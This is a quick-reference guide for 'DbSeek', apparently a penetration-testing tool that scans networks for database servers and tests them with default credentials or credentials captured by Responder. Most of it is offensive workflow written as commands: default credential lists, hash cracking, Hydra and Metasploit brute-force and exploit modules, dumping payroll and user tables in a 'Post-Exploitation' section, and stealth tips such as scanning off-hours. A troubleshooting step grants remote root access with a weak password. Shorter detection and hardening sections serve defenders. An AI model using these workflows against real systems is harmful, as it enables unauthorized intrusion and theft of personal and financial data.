# DbSeek Quick Reference

## Quick Start

```bash
# Basic discovery
./dbseek.py

# Test default credentials
./dbseek.py -t

# Test custom credentials (from Responder)
./dbseek.py -u admin -p Password123

# Test + enumerate databases (safe)
./dbseek.py -t -e

# Fast scan (50 workers)
./dbseek.py -w 50 -t

# Verbose output
./dbseek.py -v
```

## Common Commands

### Discovery
```bash
# Basic port scanning
./dbseek.py

# Specific targets
./dbseek.py -f database_servers.txt

# All hosts (including negative results)
./dbseek.py -v
```

### Credential Testing
```bash
# Default credentials
./dbseek.py -t

# Custom credentials (Responder integration)
./dbseek.py -u sqlservice -p Passw0rd!

# Both default + custom
./dbseek.py -t -u admin -p SecretPass
```

### Database Enumeration
```bash
# Enumerate with defaults
./dbseek.py -t -e

# Enumerate with custom creds
./dbseek.py -u root -p password -e

# Fast enumerate
./dbseek.py -u admin -p pass -e -w 20
```

## Supported Databases

| Database | Port(s) | Auth Test | Enumerate |
|----------|---------|-----------|-----------|
| MySQL/MariaDB | 3306 | ✅ | ✅ |
| PostgreSQL | 5432 | ✅ | ✅ |
| MSSQL | 1433 | ✅ | ✅ |
| MongoDB | 27017 | ✅ | ✅ |
| Redis | 6379 | ✅ | ❌ |
| Elasticsearch | 9200, 9300 | ✅ | ❌ |
| Oracle | 1521, 1522 | ⚠️ | ❌ |
| Cassandra | 9042, 7000, 7001 | ⚠️ | ❌ |
| CouchDB | 5984 | ⚠️ | ❌ |

## Default Credentials Tested

### MySQL
```
root:(blank)
root:root
root:password
root:toor
admin:admin
mysql:mysql
```

### PostgreSQL
```
postgres:(blank)
postgres:postgres
postgres:password
admin:admin
```

### MSSQL
```
sa:(blank)
sa:sa
sa:password
sa:Password123
admin:admin
```

### MongoDB
```
(no auth - tested first)
admin:(blank)
root:(blank)
admin:admin
root:root
```

### Redis
```
(no auth - tested first)
(password): redis
(password): password
```

### Oracle
```
sys:sys
system:manager
scott:tiger
admin:admin
```

## Output Files

| File | Description |
|------|-------------|
| `dblist.txt` | Simple list of IPs with databases |
| `db_creds.txt` | Working credentials |
| `db_details.txt` | Human-readable detailed report |
| `db_details.json` | Machine-readable JSON |

## Attack Workflows

### Workflow 1: Network Discovery
```bash
# 1. Fast discovery
./dbseek.py -w 50

# 2. Review results
cat dblist.txt
cat db_details.txt | grep CRITICAL

# 3. Count by type
cat db_details.json | jq -r '.[] | .services | keys[]' | sort | uniq -c
```

### Workflow 2: Default Credential Sweep
```bash
# 1. Test all default credentials
./dbseek.py -t -w 20

# 2. Extract working credentials
cat db_creds.txt

# 3. Connect to vulnerable hosts
mysql -h 192.168.1.50 -u root
# (blank password)
```

### Workflow 3: Responder Integration
```bash
# Terminal 1: Responder
sudo responder -I eth0 -wrf

# Wait for credential capture...
# [MSSQL] User: DOMAIN\dbadmin
# Hash: [hash]

# Terminal 2: Crack (if needed)
hashcat -m 5600 hash.txt rockyou.txt
# Result: Password123!

# Terminal 2: Test credential across network
./dbseek.py -u dbadmin -p Password123! -v -e

# Review accessible databases
cat db_details.txt | grep "Databases:"
```

### Workflow 4: Database Enumeration
```bash
# 1. Enumerate with working creds
./dbseek.py -u admin -p pass -e

# 2. Parse database names
cat db_details.json | jq -r '.[] | select(.services[].databases) | .ip + ": " + (.services[].databases | join(", "))'

# Example output:
# 192.168.1.50: mysql, hr_database, payroll, customer_data
# 192.168.1.51: postgres, financial_records, employee_db

# 3. Target high-value databases
mysql -h 192.168.1.50 -u admin -ppass -D payroll
```

### Workflow 5: Post-Exploitation
```bash
# 1. Full scan with enumeration
./dbseek.py -t -e -w 20

# 2. Select target from results
# 192.168.1.50 - MySQL - root:(blank) - Databases: payroll

# 3. Connect
mysql -h 192.168.1.50 -u root

# 4. Enumerate tables
mysql> USE payroll;
mysql> SHOW TABLES;

# 5. Extract sensitive data
mysql> SELECT * FROM employees;
mysql> SELECT * FROM salaries WHERE salary > 100000;

# 6. Dump database
mysqldump -h 192.168.1.50 -u root payroll > payroll.sql
```

## Manual Connection Commands

### MySQL
```bash
# Connect
mysql -h 192.168.1.50 -u root -p

# One-liner query
mysql -h 192.168.1.50 -u root -ppassword -e "SHOW DATABASES"

# Dump database
mysqldump -h 192.168.1.50 -u root -ppassword dbname > dump.sql

# Import
mysql -h 192.168.1.50 -u root -ppassword dbname < dump.sql
```

### PostgreSQL
```bash
# Connect
psql -h 192.168.1.51 -U postgres

# List databases
psql -h 192.168.1.51 -U postgres -l

# Connect to specific database
psql -h 192.168.1.51 -U postgres -d dbname

# Dump database
pg_dump -h 192.168.1.51 -U postgres dbname > dump.sql

# Import
psql -h 192.168.1.51 -U postgres dbname < dump.sql
```

### MSSQL
```bash
# Connect (sqlcmd)
sqlcmd -S 192.168.1.53 -U sa -P password

# List databases
sqlcmd -S 192.168.1.53 -U sa -P password -Q "SELECT name FROM sys.databases"

# Query
sqlcmd -S 192.168.1.53 -U sa -P password -d dbname -Q "SELECT * FROM table"

# Python (pymssql)
import pymssql
conn = pymssql.connect('192.168.1.53', 'sa', 'password', 'dbname')
```

### MongoDB
```bash
# Connect (no auth)
mongo --host 192.168.1.52

# Connect (with auth)
mongo --host 192.168.1.52 -u admin -p password

# List databases
mongo --host 192.168.1.52 --eval "show dbs"

# Dump database
mongodump --host 192.168.1.52 --db dbname --out ./dump/

# Restore
mongorestore --host 192.168.1.52 --db dbname ./dump/dbname/
```

### Redis
```bash
# Connect (no auth)
redis-cli -h 192.168.1.54

# Connect (with password)
redis-cli -h 192.168.1.54 -a password

# Get info
redis-cli -h 192.168.1.54 INFO

# List keys
redis-cli -h 192.168.1.54 KEYS '*'

# Dump all
redis-cli -h 192.168.1.54 --rdb dump.rdb
```

## Integration Examples

### With Nmap
```bash
# 1. Port discovery
nmap -p 3306,5432,1433,27017,6379 192.168.1.0/24 --open -oG - | \
    grep "/open/" | cut -d' ' -f2 > db_hosts.txt

# 2. DbSeek authentication testing
./dbseek.py -f db_hosts.txt -t -e
```

### With Metasploit
```bash
msfconsole

# MySQL brute force
use auxiliary/scanner/mysql/mysql_login
set RHOSTS file:dblist.txt
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

# PostgreSQL login
use auxiliary/scanner/postgres/postgres_login
set RHOSTS file:dblist.txt
run

# MSSQL exploitation
use exploit/windows/mssql/mssql_payload
set RHOST 192.168.1.53
run
```

### With Hydra
```bash
# MySQL brute force
hydra -L users.txt -P passwords.txt mysql://192.168.1.50

# PostgreSQL brute force
hydra -L users.txt -P passwords.txt postgres://192.168.1.51

# MSSQL brute force
hydra -L users.txt -P passwords.txt mssql://192.168.1.53
```

### JSON Parsing
```bash
# Extract IPs with vulnerable databases
cat db_details.json | jq -r '.[] | select(.vulnerable | length > 0) | .ip'

# Count services by type
cat db_details.json | jq -r '.[] | .services | keys[]' | sort | uniq -c

# Extract working credentials
cat db_details.json | jq -r '.[] | select(.default_creds | length > 0) | .ip + " | " + (.default_creds[] | .service + ":" + .username + ":" + .password)'

# List enumerated databases
cat db_details.json | jq -r '.[] | .services[] | select(.databases) | .databases[]' | sort -u
```

## Common Options

```
Positional:
  None (uses iplist.txt)

Required:
  None (all optional)

Optional:
  -f, --file FILE       Input file (default: iplist.txt)
  -w, --workers N       Concurrent workers (default: 10)
  -t, --test-creds      Test default credentials
  -u, --username USER   Custom username (e.g., from Responder)
  -p, --password PASS   Custom password (e.g., from Responder)
  -e, --enumerate       Enumerate databases (SAFE: read-only)
  --timeout SECONDS     Connection timeout (default: 2)
  -v, --verbose         Show all hosts
```

## Detection Indicators

### Network
- Sequential connections to multiple database ports
- Multiple authentication attempts (failed logins)
- Connections from unexpected source IPs
- Database enumeration queries in logs

### Logs

**MySQL** (`/var/log/mysql/error.log`):
```
[Warning] Access denied for user 'root'@'192.168.1.100'
```

**PostgreSQL** (`/var/log/postgresql/postgresql.log`):
```
FATAL: password authentication failed for user "postgres"
```

**MSSQL** (SQL Server Error Log):
```
Login failed for user 'sa'. Reason: Password did not match
```

**MongoDB** (`/var/log/mongodb/mongod.log`):
```
Failed to authenticate admin@admin with mechanism SCRAM-SHA-1
```

## Defense Quick Tips

### MySQL Hardening
```sql
-- Remove anonymous users
DELETE FROM mysql.user WHERE User='';

-- Remove remote root
DELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost', '127.0.0.1');

-- Set strong password
ALTER USER 'root'@'localhost' IDENTIFIED BY 'StrongPass!2023';

-- Flush
FLUSH PRIVILEGES;
```

**Configuration** (`/etc/mysql/my.cnf`):
```ini
[mysqld]
bind-address = 127.0.0.1
require_secure_transport = ON
```

### PostgreSQL Hardening

**pg_hba.conf**:
```
# No trust authentication!
local   all   all                    scram-sha-256
host    all   all   127.0.0.1/32     scram-sha-256
host    all   all   10.0.0.0/8       scram-sha-256  # Internal only
```

**postgresql.conf**:
```
listen_addresses = 'localhost'
password_encryption = scram-sha-256
```

### MSSQL Hardening
```sql
-- Disable SA
ALTER LOGIN sa DISABLE;

-- Create new admin
CREATE LOGIN db_admin WITH PASSWORD = 'VeryStrongPass!2023';
ALTER SERVER ROLE sysadmin ADD MEMBER db_admin;

-- Disable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;
```

### MongoDB Hardening

**mongod.conf**:
```yaml
security:
  authorization: enabled

net:
  bindIp: 127.0.0.1
```

**Create admin**:
```javascript
use admin
db.createUser({
  user: "admin",
  pwd: "StrongPass!2023",
  roles: [{role: "userAdminAnyDatabase", db: "admin"}]
})
```

### Redis Hardening

**redis.conf**:
```
requirepass VeryStrongPass!2023
bind 127.0.0.1

rename-command FLUSHDB ""
rename-command FLUSHALL ""
rename-command CONFIG ""
```

### Firewall Rules
```bash
# MySQL (internal only)
iptables -A INPUT -p tcp --dport 3306 -s 10.0.0.0/8 -j ACCEPT
iptables -A INPUT -p tcp --dport 3306 -j DROP

# PostgreSQL (internal only)
iptables -A INPUT -p tcp --dport 5432 -s 10.0.0.0/8 -j ACCEPT
iptables -A INPUT -p tcp --dport 5432 -j DROP

# MSSQL (internal only)
iptables -A INPUT -p tcp --dport 1433 -s 10.0.0.0/8 -j ACCEPT
iptables -A INPUT -p tcp --dport 1433 -j DROP

# MongoDB (localhost only)
iptables -A INPUT -p tcp --dport 27017 -s 127.0.0.1 -j ACCEPT
iptables -A INPUT -p tcp --dport 27017 -j DROP

# Redis (localhost only)
iptables -A INPUT -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT
iptables -A INPUT -p tcp --dport 6379 -j DROP

# Save
iptables-save > /etc/iptables/rules.v4
```

## Troubleshooting

### No Databases Found
```bash
# Increase timeout
./dbseek.py --timeout 10

# Verify port is open
nmap -p 3306 192.168.1.50

# Test manual connection
mysql -h 192.168.1.50 -u root
```

### Credential Testing Fails
```bash
# Install Python libraries
pip3 install pymysql psycopg2-binary pymssql pymongo redis

# Verify client tools
which mysql psql mongo redis-cli

# Test manual authentication
mysql -h 192.168.1.50 -u root -p
# (enter blank password)
```

### Enumeration Not Working
```bash
# Ensure Python libraries installed
python3 -c "import pymysql; print('OK')"

# Verify credentials work
./dbseek.py -u root -p password -v

# Test manual enumeration
mysql -h 192.168.1.50 -u root -ppassword -e "SHOW DATABASES"
```

### Permission Denied
```bash
# Check user has remote access (MySQL)
GRANT ALL ON *.* TO 'root'@'%' IDENTIFIED BY 'password';

# Check pg_hba.conf (PostgreSQL)
host    all    all    0.0.0.0/0    md5

# Verify database listening on network
netstat -tuln | grep 3306
```

## Tips & Tricks

### 🎯 Targeting
- Database server hostnames: db, sql, mysql, postgres, mongo, redis
- Development environments have weaker security
- Backup servers often run database instances
- Test during off-hours (less monitoring)

### 🔍 Discovery
- Use Nmap for initial port filtering
- Check DNS for database-related names
- Web server configs reveal backend databases
- phpMyAdmin/Adminer reveal database locations

### 🔒 Stealth
- Lower workers: `-w 5`
- Increase timeout: `--timeout 5`
- Spread scans over time
- Database connections are normal traffic

### ⚡ Speed
- High workers: `-w 50`
- Pre-filter with Nmap
- Skip credential testing on first pass
- Use JSON output for automation

### 🔑 Credentials
- Always try blank passwords first
- Test Responder credentials immediately
- Credential reuse is extremely common
- Service accounts rarely have passwords changed
- Password patterns: `ServiceName2023!`, `CompanyDB123!`

### 📊 Enumeration
- Use `-e` flag with confirmed credentials
- Database names reveal application purpose
- Look for: backup, prod, hr, payroll, customer, financial
- Enumeration is safe (read-only)
- Won't trigger database modification alerts

## One-Liners

```bash
# Quick vulnerable database count
./dbseek.py -t | grep CRITICAL | wc -l

# Extract all working credentials
cat db_creds.txt | grep -v "^#" | cut -d'|' -f3-4

# Connect to all MySQL servers with blank root
for ip in $(cat dblist.txt); do mysql -h $ip -u root -e "SELECT VERSION();"; done

# Enumerate all accessible databases
./dbseek.py -u root -p "" -e | grep "📊"

# Count databases by type
cat db_details.json | jq -r '.[] | .services | keys[]' | sort | uniq -c | sort -rn
```

## Real-World Examples

### Example 1: Corporate Pentest
```bash
$ ./dbseek.py -w 50 -t
Scan Complete
Total Hosts Scanned: 12450
Database Servers Found: 87
Servers with Vulnerabilities: 23 (26%)

Critical:
- 8 MySQL: blank root password
- 12 MongoDB: no authentication
- 3 Redis: no password

Impact: HR data, customer PII, financial records
```

### Example 2: Responder + DbSeek
```bash
# Responder captures MSSQL credential
[MSSQL] CORP\svc-sql:SQLPass2023!

# Test across network
$ ./dbseek.py -u svc-sql -p SQLPass2023! -v -e
[CRITICAL] 10.0.10.50 - MSSQL (sysadmin)
[CRITICAL] 10.0.10.51 - MSSQL (sysadmin)
[CRITICAL] 10.0.10.52 - MSSQL (sysadmin)
[CRITICAL] 10.0.10.53 - MySQL
[CRITICAL] 10.0.10.54 - PostgreSQL

Impact: 5 database servers from single credential
```

### Example 3: MongoDB No Auth
```bash
$ ./dbseek.py -e
[CRITICAL] 192.168.1.52 (mongo-dev) - MongoDB
    ⚠ MongoDB no authentication required
    📊 Databases: admin, config, app_db, user_db, financial

$ mongo --host 192.168.1.52
> use user_db
> db.users.find()
{ "_id": 1, "username": "admin", "password": "5f4dcc3b..." }

Impact: Complete database access
```

## Quick Reference Card

```
┌──────────────────────────────────────────────────┐
│            DBSEEK CHEAT SHEET                    │
├──────────────────────────────────────────────────┤
│ DATABASES                                        │
│  MySQL (3306)        MariaDB, MySQL              │
│  PostgreSQL (5432)   PostgreSQL                  │
│  MSSQL (1433)        Microsoft SQL Server        │
│  MongoDB (27017)     NoSQL document database     │
│  Redis (6379)        In-memory key-value store   │
│  Oracle (1521/1522)  Oracle Database             │
│  Elasticsearch (9200) Search engine              │
├──────────────────────────────────────────────────┤
│ COMMON COMMANDS                                  │
│  Discovery:      ./dbseek.py                     │
│  Test creds:     ./dbseek.py -t                  │
│  Custom creds:   ./dbseek.py -u user -p pass     │
│  Enumerate:      ./dbseek.py -u user -p pass -e  │
├──────────────────────────────────────────────────┤
│ MANUAL CONNECTIONS                               │
│  MySQL:   mysql -h IP -u root -p                 │
│  Postgres: psql -h IP -U postgres                │
│  MSSQL:   sqlcmd -S IP -U sa -P password         │
│  MongoDB: mongo --host IP -u admin -p pass       │
│  Redis:   redis-cli -h IP -a password            │
└──────────────────────────────────────────────────┘
```

## Learning Resources

- **MySQL Security**: https://dev.mysql.com/doc/refman/8.0/en/security.html
- **PostgreSQL Security**: https://www.postgresql.org/docs/current/auth-methods.html
- **MSSQL Security Best Practices**: https://docs.microsoft.com/en-us/sql/relational-databases/security/
- **MongoDB Security Checklist**: https://docs.mongodb.com/manual/administration/security-checklist/
- **Redis Security**: https://redis.io/topics/security
- **MITRE ATT&CK**: T1078 (Valid Accounts), T1213 (Data from Information Repositories)
- **OWASP**: Database Security Cheat Sheet
